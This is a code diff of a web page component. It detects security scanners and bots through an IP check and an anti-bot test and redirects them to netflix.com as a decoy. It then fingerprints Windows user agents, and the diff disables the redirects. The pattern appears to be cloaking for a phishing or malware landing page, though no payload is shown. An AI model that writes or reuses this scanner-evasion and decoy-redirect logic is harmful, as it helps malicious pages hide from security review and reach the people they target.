@@ -21,7 +21,8 @@ export default function Home() {
     autoVerify: false,
     onBotDetected: () => {
       trackEvent('Bot Detected - Redirecting');
-      window.location.href = 'https://www.netflix.com';
+      // Disabled for now - redirects removed
+      // window.location.href = 'https://www.netflix.com';
     },
   });
 
@@ -52,25 +53,29 @@ export default function Home() {
 
     const runSecurityChecks = async () => {
       try {
+        // Set page visible immediately
+        setIsCheckingIP(false);
+
         const ipResponse = await fetch('/api/check-ip');
         const ipData = await ipResponse.json();
         
         if (!ipData.isSafe) {
           trackEvent('Cloaked Visitor Detected', { checks: ipData.checks });
-          window.location.href = 'https://www.netflix.com';
-          return;
+          // Disabled - redirects removed
+          // window.location.href = 'https://www.netflix.com';
+          // return;
         }
 
         const isHuman = await verify();
         
         if (!isHuman) {
           trackEvent('Bot Detected via Anti-Bot', { threatScore });
-          window.location.href = 'https://www.netflix.com';
-          return;
+          // Disabled - redirects removed
+          // window.location.href = 'https://www.netflix.com';
+          // return;
         }
 
         setSecurityCheckComplete(true);
-        setIsCheckingIP(false);
 
         const userAgent = navigator.userAgent.toLowerCase();
         const windowsDetected = /windows|win32|win64/.test(userAgent);
